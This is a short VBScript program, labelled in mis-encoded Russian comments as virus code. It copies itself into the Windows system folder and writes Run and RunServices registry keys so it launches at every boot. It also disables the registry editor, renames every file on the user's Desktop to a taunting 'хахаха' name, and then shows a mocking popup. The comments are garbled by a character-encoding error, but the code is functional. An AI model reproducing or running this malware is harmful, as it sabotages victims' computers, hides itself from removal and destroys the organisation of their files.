   '            =======> ÊÎÄ ÂÈÐÓÑÀ <=======

   '      Îáúÿâëåíèå ïåðåìåííûõ(ýòîò àáçàö íå ïåðåìåùàòü)
   Set f = CreateObject("scripting.filesystemobject")
   Set s = CreateObject("Wscript.Shell")
   t=0: on error resume next
   Set os = CreateObject("Shell.Application")
   set ie = WScript.CreateObject("InternetExplorer.Application")
   Set oe = WScript.CreateObject("Outlook.Application")


   ' Çàïóñêàòüñÿ ïðè êàæäîé ïåðåçàãðóçêå
   Set File2 = f.GetFile(WScript.ScriptFullName)
   File2.Copy ("c:\windows\System\Gigabyte.vbs")
   s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
   s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

   ' Áëîêèðîâàòü RegEdit(÷òîá ó íåãî íå çàâîäèëñÿ ðåäàêòîð ðååñòðà).Äëÿ òîãî ÷òîáû ðàçáëîêèðîâàòü ïðîèñâîéòå DisableRegistryTools çíà÷åíèå - 0
   s.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"

   ' Ïåðåèìåíîâàíèå âñåõ ôàéëîâ, íàõîäÿùèõñÿ íà Ðîáî÷åì ñòîëå íà "õàõàõà"
   For Each Folder In s.SpecialFolders
   if right(folder,12)="Ðàáî÷èé ñòîë" then
   set tf=f.getfolder(folder)
   set af=tf.files
   For Each fl In af
   set file=f.getfile(fl):t=t+1
   file.name="õàõàõà" & t
   next
   end if
   next

   '     Âûâåñòè ñîîáùåíèå
   s.popup "ïîïàëñÿ!!!!!!!!!!!!!!!!", 1, "òåáÿ îòàêîâàëè", 0+48
